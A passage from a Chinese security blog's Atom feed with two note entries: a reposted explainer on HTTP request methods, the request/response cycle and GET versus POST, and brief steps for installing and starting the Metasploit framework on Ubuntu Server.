<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<p>GET     请求指定的页面信息，并返回实体主体。<br>HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>PUT     从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE      请求服务器删除指定的页面。<br>CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>OPTIONS     允许客户端查看服务器的性能。<br>TRACE     回显服务器收到的请求，主要用于测试或诊断。</p>
<h1 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h1><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>1、客户端连接到Web服务器</p>
<p>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
<p>2、发送HTTP请求</p>
<p>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>3、服务器接受请求并返回HTTP响应</p>
<p>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>4、释放连接TCP连接</p>
<p>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>5、客户端浏览器解析HTML内容</p>
<p>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
<p>5、释放 TCP连接;</p>
<p>6、浏览器将该 html 文本并显示内容; 　　</p>
<h1 id="GET和POST请求的区别"><a href="#GET和POST请求的区别" class="headerlink" title="GET和POST请求的区别"></a>GET和POST请求的区别</h1><p>GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET /books/?sex=man&amp;name=Professional HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure>
<p>注意最后一行是空行</p>
<p>POST请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p>
<p>POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据</p>
<p>因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</p>
<p>2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。</p>
<p>而在实际开发中存在的限制主要有：</p>
<p>GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。</p>
<p>因此对于GET提交时，传输数据就会受到URL长度的 限制。</p>
<p>POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</p>
<p>3、安全性</p>
<p>POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击</p>
<p>4、Http get,post,soap协议都是在http上运行的</p>
<p>（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的<br>查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全</p>
<p>（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。<br>但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。</p>
<p>（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式<br>Content-type设置为: text/xml 任何数据都可以xml化。</p>
<p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p>
<p>我们看看GET和POST的区别</p>
<p>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.</p>
<p>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<p>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。</p>
<p>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</p>
<p>原文地址：<a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="external">http://www.cnblogs.com/ranyonsue/p/5984001.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu Server下安装配置Metasploit</title>
    <link href="http://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html"/>
    <id>http://uknowsec.cn/posts/notes/Ubuntu-Server下安装配置Metasploit.html</id>
    <published>2017-04-25T03:29:27.000Z</published>
    <updated>2017-04-25T04:02:45.215Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="安装postgersql"><a href="#安装postgersql" class="headerlink" title="安装postgersql"></a>安装postgersql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install postgersql</div></pre></td></tr></table></figure>
<h1 id="下载Metasploit"><a href="#下载Metasploit" class="headerlink" title="下载Metasploit"></a>下载Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<h1 id="安装Metasploit"><a href="#安装Metasploit" class="headerlink" title="安装Metasploit"></a>安装Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">sudo mkdir metasploit</div><div class="line">sudo ./metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<ul>
<li>在安装的过程中开始是license内容可以一直回车，然后输入y，同意license</li>
<li>然后会要你选择一个空文件夹，此时输入刚刚创建的文件夹 /opt/metasploit</li>
<li>最后还会让你选择是否metasploit自行创建postgersql，可输入y。等待即可安装成功</li>
</ul>
<h1 id="启动Metasploit"><a href="#启动Metasploit" class="headerlink" title="启动Metasploit"></a>启动Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">service postgresql start		//启动PostgreSQL服务</div><div class="line">service metasploit start		//启动Metasploit服务</div><div class="line">msfconsole		//启动Metasploit</div><div class="line">db_status		//查看数据库连接状态</div></pre></td></tr></table></figure>
<ul>
<li>如果启动metasploit的时候出现Warning提示没有查看datebase.yml的权限可以输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml</div></pre></td></tr></table></figure>
<ul>
<li>重新启动就可以自动连接数据库了</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
</feed>
